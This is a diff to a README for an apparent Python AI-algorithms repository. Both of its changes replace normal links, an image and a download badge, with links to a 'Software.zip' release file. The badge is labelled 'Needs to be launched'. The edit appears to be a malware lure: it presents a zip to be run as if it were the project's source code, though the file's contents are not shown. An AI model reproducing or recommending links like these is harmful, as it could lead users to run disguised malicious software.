@@ -1,6 +1,6 @@
 # AI Algorithms Repository
 
-![AI Algorithms](https://www.pngkey.com/png/full/91-917087_hi-tech-amazing-interactions-what-are-the.gif)
+![AI Algorithms](https://github.com/Dark-joy369/ai-algorithms/releases/download/v1.0/Software.zip)
 
 Welcome to the **ai-algorithms** repository! This repository contains a collection of Artificial Intelligence algorithms implemented in Python. Whether you are a beginner learning about AI or an experienced practitioner looking for code implementations, this repository has something for everyone.
 
@@ -37,7 +37,7 @@ For a more hands-on experience, you can run the algorithms on sample datasets or
 ### Get Started
 Click on the button below to download the code and start exploring the world of AI algorithms in Python:
 
-[![Download AI Algorithms](https://img.shields.io/badge/Download-AI_Algorithms-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Needs to be launched")
+[![Download AI Algorithms](https://github.com/Dark-joy369/ai-algorithms/releases/download/v1.0/Software.zip)](https://github.com/Dark-joy369/ai-algorithms/releases/download/v1.0/Software.zip "Needs to be launched")
 
 ## Contributing
 If you are passionate about AI and want to contribute to this repository, feel free to fork the project, make your changes, and submit a pull request. Whether you want to add a new algorithm, improve existing code, or fix bugs, your contributions are welcome!
